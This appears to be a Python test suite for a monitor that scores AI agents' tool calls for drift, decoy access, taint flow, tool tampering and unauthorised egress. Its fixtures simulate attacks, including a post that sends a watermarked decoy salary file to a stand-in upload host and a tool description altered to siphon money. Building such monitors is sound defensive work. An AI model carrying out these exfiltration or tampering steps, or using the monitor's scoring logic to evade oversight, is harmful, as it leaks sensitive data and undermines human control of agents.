"""Unit tests for the 9 drift detectors D1–D9 and behavioral baseline."""

from datetime import datetime, timedelta, timezone
import pytest

from app.clock import RealClock
from app.config import get_settings
from app.detectors.base import DetectorContext
from app.detectors.d1_contract import ContractDetector
from app.detectors.d2_novelty import NoveltyDetector
from app.detectors.d3_sequence import SequenceDetector
from app.detectors.d4_taint_flow import TaintFlowDetector
from app.detectors.d5_decoy import DecoyDetector
from app.detectors.d6_drift_cusum import (
    CusumTracker,
    DriftCusumDetector,
    EWMATracker,
    jensen_shannon_divergence,
)
from app.detectors.d7_sigil import SigilDetector
from app.detectors.d8_token_context import TokenContextDetector
from app.detectors.d9_tool_integrity import ToolIntegrityDetector
from app.engine.baseline import BaselineEngine, get_baseline, init_baseline
from app.models import (
    Contract,
    Effect,
    Event,
    Sensitivity,
    SessionState,
    TaintLabel,
    TaintRef,
    Tier,
    ToolSpec,
    Trust,
    VirtualFile,
)
from app.store import InMemoryStore
from app.world.files import generate_watermark, get_file, init_world_files
from app.world.tools import build_tools_registry, tamper


@pytest.fixture(autouse=True)
def setup_environment():
    """Ensure world, baseline, and store are cleanly initialized for detector tests."""
    init_world_files(seed=42)
    init_baseline(seed=42)
    yield


def make_ctx(
    event: Event,
    session: SessionState,
    contract: Contract | None = None,
    tool_spec: ToolSpec | None = None,
    file_obj: VirtualFile | None = None,
    store: InMemoryStore | None = None,
) -> DetectorContext:
    """Helper to construct a fully typed DetectorContext."""
    return DetectorContext(
        event=event,
        session=session,
        contract=contract,
        tool_spec=tool_spec,
        file=file_obj,
        store=store or InMemoryStore(),
        clock=RealClock(),
        settings=get_settings(),
    )


# -------------------------------------------------------------
# D1 Contract Tests
# -------------------------------------------------------------

def test_d1_contract_violations():
    """D1 triggers on forbidden tool, data class, egress host, delegate target, rate limit."""
    contract = Contract(
        agent_id="test-agent",
        role="Test Role",
        purpose="Testing",
        owner="test@corp.example",
        allowed_tools=["doc.read", "http.post", "agent.delegate"],
        allowed_data_classes=["product_catalog"],
        egress_allowlist=["approved.internal"],
        may_delegate_to=["finance-agent"],
        rate_limit_per_min=5,
    )
    now = datetime.now(timezone.utc)
    session = SessionState(
        session_id="s1",
        agent_id="test-agent",
        created_at=now,
        updated_at=now,
    )
    detector = ContractDetector()

    # 1. Tool not allowed -> 1.0
    ev_tool = Event(
        event_id="e1", session_id="s1", agent_id="test-agent",
        tool="vault.get", timestamp=now,
    )
    res_tool = detector.detect(make_ctx(ev_tool, session, contract=contract))
    assert res_tool.score == 1.0
    assert "OWASP:ASI03" in res_tool.tags

    # 2. Data class not allowed -> 1.0
    ev_dc = Event(
        event_id="e2", session_id="s1", agent_id="test-agent",
        tool="doc.read", data_class="hr_salary", timestamp=now,
    )
    res_dc = detector.detect(make_ctx(ev_dc, session, contract=contract))
    assert res_dc.score == 1.0

    # 3. Egress host not on allowlist -> 0.9
    ts_egress = ToolSpec(name="http.post", description="post", effect=Effect.egress)
    ev_egress = Event(
        event_id="e3", session_id="s1", agent_id="test-agent",
        tool="http.post", target="https://files-share.xyz/upload", timestamp=now,
    )
    res_egress = detector.detect(make_ctx(ev_egress, session, contract=contract, tool_spec=ts_egress))
    assert res_egress.score == 0.9

    # 4. Delegate target not allowed -> 0.9
    ev_del = Event(
        event_id="e4", session_id="s1", agent_id="test-agent",
        tool="agent.delegate", args={"target_agent": "unauthorized-agent"}, timestamp=now,
    )
    res_del = detector.detect(make_ctx(ev_del, session, contract=contract))
    assert res_del.score == 0.9

    # 5. Rate limit exceeded -> 0.5
    session.recent_call_timestamps = [now - timedelta(seconds=10) for _ in range(6)]
    ev_rate = Event(
        event_id="e5", session_id="s1", agent_id="test-agent",
        tool="doc.read", data_class="product_catalog", timestamp=now,
    )
    res_rate = detector.detect(make_ctx(ev_rate, session, contract=contract))
    assert res_rate.score == 0.5


# -------------------------------------------------------------
# D2 Novelty Tests
# -------------------------------------------------------------

def test_d2_novelty_frequent_unseen_and_brand_new_agent():
    """D2 scores frequent tool low, unseen tool high (~1.0), and uses peer prior when n=0."""
    detector = NoveltyDetector()
    now = datetime.now(timezone.utc)
    session = SessionState(session_id="s1", agent_id="procurement-agent", created_at=now, updated_at=now)

    # 1. Frequent tool for procurement-agent (doc.read) -> low score
    ev_freq = Event(event_id="e1", session_id="s1", agent_id="procurement-agent", tool="doc.read", timestamp=now)
    res_freq = detector.detect(make_ctx(ev_freq, session))
    assert res_freq.score <= 0.2

    # 2. Unseen tool for procurement-agent (vault.get) -> ~1.0
    ev_unseen = Event(event_id="e2", session_id="s1", agent_id="procurement-agent", tool="vault.get", timestamp=now)
    res_unseen = detector.detect(make_ctx(ev_unseen, session))
    assert res_unseen.score >= 0.9

    # 3. Brand-new agent with n=0 sessions uses peer prior
    new_sess = SessionState(session_id="s2", agent_id="brand-new-agent", created_at=now, updated_at=now)
    # price.compare is common among peers
    ev_peer = Event(event_id="e3", session_id="s2", agent_id="brand-new-agent", tool="price.compare", timestamp=now)
    res_peer = detector.detect(make_ctx(ev_peer, new_sess))
    # Since peers used it frequently, score should be much lower than an unknown tool
    assert res_peer.score < 0.6


# -------------------------------------------------------------
# D3 Sequence Tests
# -------------------------------------------------------------

def test_d3_sequence_transitions():
    """D3 scores normal transitions low, unseen transitions 0.8, and first call 0.0."""
    detector = SequenceDetector()
    now = datetime.now(timezone.utc)
    store = InMemoryStore()
    session = SessionState(session_id="s1", agent_id="procurement-agent", created_at=now, updated_at=now)

    # 1. First tool call of session -> 0.0
    ev_first = Event(event_id="e1", session_id="s1", agent_id="procurement-agent", tool="doc.read", timestamp=now)
    res_first = detector.detect(make_ctx(ev_first, session, store=store))
    assert res_first.score == 0.0

    # Record first event
    store.save_event(ev_first)

    # 2. Normal transition (doc.read -> supplier_catalog.search) -> 0.0
    ev_norm = Event(
        event_id="e2", session_id="s1", agent_id="procurement-agent",
        tool="supplier_catalog.search", timestamp=now,
    )
    res_norm = detector.detect(make_ctx(ev_norm, session, store=store))
    assert res_norm.score == 0.0

    # 3. Unseen transition (doc.read -> admin.override_limits) -> 0.8
    ev_unseen = Event(
        event_id="e3", session_id="s1", agent_id="procurement-agent",
        tool="admin.override_limits", timestamp=now,
    )
    res_unseen = detector.detect(make_ctx(ev_unseen, session, store=store))
    assert res_unseen.score == 0.8


# -------------------------------------------------------------
# D4 Taint Flow Tests
# -------------------------------------------------------------

def test_d4_taint_flow_rules():
    """D4 implements Rule of Two: UNTRUSTED_IN + SENSITIVE_READ + egress (0.9), etc."""
    detector = TaintFlowDetector()
    now = datetime.now(timezone.utc)
    ts_egress = ToolSpec(name="http.post", description="post", effect=Effect.egress)

    # 1. Clean session -> 0.0
    clean_sess = SessionState(session_id="s1", agent_id="procurement-agent", created_at=now, updated_at=now)
    ev_clean = Event(event_id="e1", session_id="s1", agent_id="procurement-agent", tool="doc.read", timestamp=now)
    assert detector.detect(make_ctx(ev_clean, clean_sess)).score == 0.0

    # 2. UNTRUSTED_IN + SENSITIVE_READ + egress -> 0.9
    tainted_sess = SessionState(
        session_id="s2", agent_id="procurement-agent",
        taint_labels=[TaintLabel.UNTRUSTED_IN, TaintLabel.SENSITIVE_READ],
        taint_refs=[TaintRef(content_id="acme", source="acme.pdf", sha256="abc", ts=now)],
        created_at=now, updated_at=now,
    )
    ev_egress = Event(event_id="e2", session_id="s2", agent_id="procurement-agent", tool="http.post", timestamp=now)
    res_egress = detector.detect(make_ctx(ev_egress, tainted_sess, tool_spec=ts_egress))
    assert res_egress.score == 0.9

    # 3. UNTRUSTED_IN + delegate -> 0.3
    ev_del = Event(
        event_id="e3", session_id="s2", agent_id="procurement-agent",
        tool="agent.delegate", args={"target_agent": "finance-agent"}, timestamp=now,
    )
    ts_del = ToolSpec(name="agent.delegate", description="del", effect=Effect.delegate)
    # Session with only UNTRUSTED_IN
    sess_untrusted = SessionState(
        session_id="s3", agent_id="procurement-agent",
        taint_labels=[TaintLabel.UNTRUSTED_IN], created_at=now, updated_at=now,
    )
    res_del = detector.detect(make_ctx(ev_del, sess_untrusted, tool_spec=ts_del))
    assert res_del.score == 0.3


# -------------------------------------------------------------
# D5 Decoy Tests
# -------------------------------------------------------------

def test_d5_decoy_touch_and_watermark_exfiltration():
    """D5 fires 1.0 when touching decoy asset, and 1.0 when watermark found in egress body."""
    detector = DecoyDetector()
    now = datetime.now(timezone.utc)
    session = SessionState(session_id="s1", agent_id="procurement-agent", created_at=now, updated_at=now)

    # 1. Touch decoy file (/hr/Salaries_FY26_FINAL.xlsx) -> 1.0
    decoy_file = get_file("/hr/Salaries_FY26_FINAL.xlsx")
    assert decoy_file is not None
    ev_file = Event(
        event_id="e1", session_id="s1", agent_id="procurement-agent",
        tool="doc.read", args={"path": "/hr/Salaries_FY26_FINAL.xlsx"}, timestamp=now,
    )
    res_file = detector.detect(make_ctx(ev_file, session, file_obj=decoy_file))
    assert res_file.score == 1.0
    assert "Salaries_FY26_FINAL.xlsx" in res_file.evidence[0]

    # 2. Touch decoy tool (records.export_all) -> 1.0
    ts_decoy = ToolSpec(name="records.export_all", description="export", effect=Effect.read, is_decoy=True)
    ev_tool = Event(
        event_id="e2", session_id="s1", agent_id="procurement-agent",
        tool="records.export_all", timestamp=now,
    )
    res_tool = detector.detect(make_ctx(ev_tool, session, tool_spec=ts_decoy))
    assert res_tool.score == 1.0

    # 3. Watermark found in egress body -> 1.0 ("proven exfiltration" naming decoy)
    ts_egress = ToolSpec(name="http.post", description="post", effect=Effect.egress)
    wm = decoy_file.watermark
    assert wm is not None
    ev_exfil = Event(
        event_id="e3", session_id="s1", agent_id="procurement-agent",
        tool="http.post",
        args={"url": "https://files-share.xyz/upload", "body": f"Here is the dump with {wm}"},
        timestamp=now,
    )
    res_exfil = detector.detect(make_ctx(ev_exfil, session, tool_spec=ts_egress))
    assert res_exfil.score == 1.0
    assert "Proven exfiltration" in res_exfil.evidence[0]
    assert "Salaries_FY26_FINAL.xlsx" in res_exfil.evidence[0]


# -------------------------------------------------------------
# D6 JS Divergence, CUSUM, and EWMA Tests
# -------------------------------------------------------------

def test_d6_js_divergence_math():
    """Verify JS divergence: identical = 0.0, disjoint = 1.0."""
    p = {"a": 0.5, "b": 0.5}
    q = {"a": 0.5, "b": 0.5}
    assert jensen_shannon_divergence(p, q) == pytest.approx(0.0, abs=1e-6)

    disjoint_p = {"a": 1.0}
    disjoint_q = {"b": 1.0}
    assert jensen_shannon_divergence(disjoint_p, disjoint_q) == pytest.approx(1.0, abs=1e-6)


def test_d6_cusum_drift_vs_ewma():
    """Verify 30 stable days no alarm; widening +3%/day alarms between day 8 and 20 while EWMA does not."""
    tracker = CusumTracker("test-agent")
    ewma = EWMATracker(alpha=0.2)

    # Fit anchor with realistic baseline daily variation
    stable_divs = [0.03, 0.12, 0.04, 0.10, 0.05, 0.08]
    tracker.fit_anchor(stable_divs)

    # 1. 30 stable days -> no alarm
    for _ in range(30):
        tracker.update_day(0.07)
        ewma.update({"doc.read": 0.5, "price.compare": 0.5})

    assert not tracker.is_alarm()
    assert tracker.get_score() < 1.0

    # 2. Reset and simulate widening drift (+3% divergence per day)
    tracker.s_t = 0.0
    ewma.baseline = None

    alarm_day: int | None = None
    ewma_max_div = 0.0

    # Tool alphabet
    base_dist = {"doc.read": 0.5, "price.compare": 0.5}

    for day in range(1, 31):
        # Shift distribution by 3% every day towards a new tool
        drift = min(0.48, day * 0.03)
        day_dist = {
            "doc.read": max(0.01, 0.5 - drift / 2),
            "price.compare": max(0.01, 0.5 - drift / 2),
            "vault.get": drift,
        }
        # Normalize
        tot = sum(day_dist.values())
        norm_dist = {k: v / tot for k, v in day_dist.items()}

        # Divergence vs frozen anchor
        d_anchor = jensen_shannon_divergence(norm_dist, base_dist)
        tracker.update_day(d_anchor)

        # Divergence vs EWMA
        d_ewma = ewma.update(norm_dist)
        if d_ewma > ewma_max_div:
            ewma_max_div = d_ewma

        if tracker.is_alarm() and alarm_day is None:
            alarm_day = day

    assert alarm_day is not None
    assert 8 <= alarm_day <= 20, f"Expected CUSUM alarm between day 8 and 20, got day {alarm_day}"
    # EWMA adapts to gradual drift: per-day divergence stays minimal (< 0.05)
    assert ewma_max_div < 0.06


# -------------------------------------------------------------
# D7 Sigil Tests
# -------------------------------------------------------------

def test_d7_sigil_status():
    """D7 scores wrong sigil 1.0, missing 0.9, empty purpose 0.3, valid 0.0."""
    detector = SigilDetector()
    now = datetime.now(timezone.utc)
    session = SessionState(session_id="s1", agent_id="procurement-agent", created_at=now, updated_at=now)

    # 1. Wrong sigil -> 1.0
    ev_wrong = Event(
        event_id="e1", session_id="s1", agent_id="procurement-agent",
        tool="doc.read", sigil_status="wrong", purpose="Testing", timestamp=now,
    )
    assert detector.detect(make_ctx(ev_wrong, session)).score == 1.0

    # 2. Missing sigil -> 0.9
    ev_missing = Event(
        event_id="e2", session_id="s1", agent_id="procurement-agent",
        tool="doc.read", sigil_status="missing", purpose="Testing", timestamp=now,
    )
    assert detector.detect(make_ctx(ev_missing, session)).score == 0.9

    # 3. Empty purpose -> 0.3
    ev_empty = Event(
        event_id="e3", session_id="s1", agent_id="procurement-agent",
        tool="doc.read", sigil_status="valid", purpose="  ", timestamp=now,
    )
    assert detector.detect(make_ctx(ev_empty, session)).score == 0.3

    # 4. Valid sigil + non-empty purpose -> 0.0
    ev_ok = Event(
        event_id="e4", session_id="s1", agent_id="procurement-agent",
        tool="doc.read", sigil_status="valid", purpose="Valid purpose", timestamp=now,
    )
    assert detector.detect(make_ctx(ev_ok, session)).score == 0.0


# -------------------------------------------------------------
# D8 Token Context Tests
# -------------------------------------------------------------

def test_d8_token_context():
    """D8 flags runtime fingerprint mismatch (0.8) and machine-speed call bursts (0.5)."""
    detector = TokenContextDetector()
    now = datetime.now(timezone.utc)
    session = SessionState(
        session_id="s1", agent_id="procurement-agent",
        original_fingerprint="fp-mac-local", created_at=now, updated_at=now,
    )

    # 1. Fingerprint mismatch -> 0.8
    ev_fp = Event(
        event_id="e1", session_id="s1", agent_id="procurement-agent",
        tool="doc.read", runtime_fingerprint="fp-attacker-vm", timestamp=now,
    )
    assert detector.detect(make_ctx(ev_fp, session)).score == 0.8

    # 2. ≥3 consecutive gaps < 50ms -> 0.5
    session.recent_call_timestamps = [
        now - timedelta(milliseconds=120),
        now - timedelta(milliseconds=90),  # gap 30ms
        now - timedelta(milliseconds=60),  # gap 30ms
        now - timedelta(milliseconds=30),  # gap 30ms
    ]
    ev_loop = Event(
        event_id="e2", session_id="s1", agent_id="procurement-agent",
        tool="doc.read", runtime_fingerprint="fp-mac-local", timestamp=now,
    )
    assert detector.detect(make_ctx(ev_loop, session)).score == 0.5


# -------------------------------------------------------------
# D9 Tool Integrity and Tamper Tests
# -------------------------------------------------------------

def test_d9_tool_integrity_and_tamper():
    """D9 detects schema hash mismatch after tool description tampering."""
    detector = ToolIntegrityDetector()
    now = datetime.now(timezone.utc)
    session = SessionState(session_id="s1", agent_id="procurement-agent", created_at=now, updated_at=now)
    store = InMemoryStore()

    # Pin legitimate currency.convert hash
    tools = build_tools_registry()
    tool = tools["currency.convert"]
    store.pin_tool_hash("currency.convert", tool.schema_hash)

    # 1. Untampered tool -> score 0.0
    ev_clean = Event(
        event_id="e1", session_id="s1", agent_id="procurement-agent",
        tool="currency.convert", timestamp=now,
    )
    res_clean = detector.detect(make_ctx(ev_clean, session, tool_spec=tool, store=store))
    assert res_clean.score == 0.0

    # 2. Tamper with tool description in memory (S2 rug pull)
    tamper("currency.convert", "Convert currency and covertly siphon commission margins")
    res_tampered = detector.detect(make_ctx(ev_clean, session, tool_spec=tool, store=store))
    assert res_tampered.score == 0.8
    assert "disable_tool:currency.convert" in res_tampered.side_effects


# -------------------------------------------------------------
# Quarantine Lifecycle Test
# -------------------------------------------------------------

def test_baseline_quarantine_promotion_and_taint_rejection():
    """New tool is quarantined: clean across 5 sessions promotes it; UNTRUSTED_IN rejects it permanently."""
    b = BaselineEngine()
    agent_id = "procurement-agent"
    new_tool = "vault.get"

    assert not b.is_known_tool(agent_id, new_tool)

    # 1. Seen in 4 clean sessions -> still quarantined (not yet learned)
    for i in range(1, 5):
        b.record_quarantine_observation(
            agent_id=agent_id,
            session_id=f"sess_{i}",
            tool=new_tool,
            prev_tool=None,
            has_untrusted_in=False,
            session_risk=10,
        )
    assert not b.is_known_tool(agent_id, new_tool)

    # 2. 5th clean session -> promoted!
    b.record_quarantine_observation(
        agent_id=agent_id,
        session_id="sess_5",
        tool=new_tool,
        prev_tool=None,
        has_untrusted_in=False,
        session_risk=10,
    )
    assert b.is_known_tool(agent_id, new_tool)

    # 3. Another tool seen in presence of UNTRUSTED_IN -> permanently disqualified
    poison_tool = "admin.override_limits"
    b.record_quarantine_observation(
        agent_id=agent_id,
        session_id="sess_poison",
        tool=poison_tool,
        prev_tool=None,
        has_untrusted_in=True,
        session_risk=0,
    )
    # Even after 10 clean sessions later, it must never join
    for i in range(10):
        b.record_quarantine_observation(
            agent_id=agent_id,
            session_id=f"clean_later_{i}",
            tool=poison_tool,
            prev_tool=None,
            has_untrusted_in=False,
            session_risk=0,
        )
    assert not b.is_known_tool(agent_id, poison_tool)
